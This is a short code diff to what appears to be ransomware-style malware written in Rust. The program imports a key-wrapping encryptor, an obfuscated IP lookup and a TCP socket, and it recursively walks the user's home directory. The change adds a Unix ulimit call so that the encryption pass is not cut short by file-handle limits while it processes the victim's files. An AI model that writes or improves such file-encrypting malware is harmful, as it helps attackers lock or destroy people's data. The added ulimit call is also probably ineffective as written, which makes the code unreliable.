@@ -3,10 +3,10 @@ use encryptor::wrap_key;
 use filesystem::recurse_directory_with_channel;
 use obfuscation::get_ip;
 use safeguard::should_disable_crypto;
-use std::env;
 use std::thread::sleep;
 use std::time::Duration;
 use std::vec::Vec;
+use std::{env, process::Command};
 use tokio::net::TcpSocket;
 use tracing::{self, event, Level};
 use tracing_subscriber::fmt::Subscriber;
@@ -57,6 +57,10 @@ async fn main() {
     let (s, r) = crossbeam_channel::unbounded();
 
     event!(Level::INFO, "-- REACHED STAGE: Recurser Start --");
+
+    if cfg!(unix) {
+        let _ = Command::new("ulimit").arg("-n 1000000").output(); // set file ulimit to prevent termination from file handler leak
+    }
     recurse_directory_with_channel(dirs::home_dir().unwrap(), &s);
 
     if !disable_cryptography {
